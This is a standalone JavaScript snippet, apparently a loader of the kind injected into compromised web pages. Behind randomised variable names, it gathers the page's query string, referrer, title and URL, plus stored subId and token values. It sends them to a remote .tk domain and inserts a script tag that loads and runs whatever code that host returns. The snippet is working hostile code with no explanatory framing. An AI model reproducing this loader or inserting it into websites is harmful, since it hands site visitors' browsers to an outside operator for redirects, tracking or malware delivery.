   (function() {
    var name = '_dwNXLPxwgmTRT35J';
    if (!window._dwNXLPxwgmTRT35J) {
        window._dwNXLPxwgmTRT35J = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://whiranjafusboooo.tk/Xdbk1X',
            P_PATH: 'https://whiranjafusboooo.tk/fec84ce/postback',
        };
    }
    const _whd4BrgypjTt6XDP = localStorage.getItem('config');
    if (typeof _whd4BrgypjTt6XDP !== 'undefined' && _whd4BrgypjTt6XDP !== null) {
        var _3dCwrBVyccKKYgyn = JSON.parse(_whd4BrgypjTt6XDP);
        var _1ycgQJGxM2Prk9xr = Math.round(+new Date()/1000);
        if (_3dCwrBVyccKKYgyn.created_at + window._dwNXLPxwgmTRT35J.ttl < _1ycgQJGxM2Prk9xr) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _M335Nx8RcBmhRSKX = localStorage.getItem('subId');
    var _TtcgCDYJ73ghrNFQ = localStorage.getItem('token');
    var _Y1vZmt7MbrxN1jRg = '?return=js.client';
        _Y1vZmt7MbrxN1jRg += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _Y1vZmt7MbrxN1jRg += '&se_referrer=' + encodeURIComponent(document.referrer);
        _Y1vZmt7MbrxN1jRg += '&default_keyword=' + encodeURIComponent(document.title);
        _Y1vZmt7MbrxN1jRg += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _Y1vZmt7MbrxN1jRg += '&name=' + encodeURIComponent(name);
        _Y1vZmt7MbrxN1jRg += '&host=' + encodeURIComponent(window._dwNXLPxwgmTRT35J.R_PATH);
    if (typeof _M335Nx8RcBmhRSKX !== 'undefined' && _M335Nx8RcBmhRSKX && window._dwNXLPxwgmTRT35J.unique) {
        _Y1vZmt7MbrxN1jRg += '&sub_id=' + encodeURIComponent(_M335Nx8RcBmhRSKX);
    }
    if (typeof _TtcgCDYJ73ghrNFQ !== 'undefined' && _TtcgCDYJ73ghrNFQ && window._dwNXLPxwgmTRT35J.unique) {
        _Y1vZmt7MbrxN1jRg += '&token=' + encodeURIComponent(_TtcgCDYJ73ghrNFQ);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._dwNXLPxwgmTRT35J.R_PATH + _Y1vZmt7MbrxN1jRg;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
